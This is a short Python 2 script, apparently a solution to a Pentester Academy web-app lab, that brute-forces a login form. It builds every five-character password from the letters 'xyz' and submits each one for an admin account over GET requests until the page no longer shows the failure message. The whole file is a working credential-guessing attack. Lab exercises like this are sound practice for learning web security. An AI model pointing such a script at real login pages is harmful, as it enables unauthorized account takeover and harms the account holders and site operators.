
__author__ = "Tarunkant Gupta"

import requests
import re
import itertools

cmp = "Failed! Please try again!"

url = "http://pentesteracademylab.appspot.com/lab/webapp/1?"


def word_list(name,pos):
	name = list(name)
	words = list(itertools.product(name, repeat=pos))
	word_list = []
	for i in words:
		word_list.append("".join(i))
	return word_list

def brute_force(username):
	words_list = word_list('xyz',5)
	for i in words_list:
		query = url + "email=" + username + "@pentesteracademy.com" + "&password=" + i
		req = requests.get(query)
		res = req.text
		tmp = re.findall(cmp, res)
		if not tmp:
			print "For " + username
			print "Password is: " + i
			break
		print i

brute_force('admin')
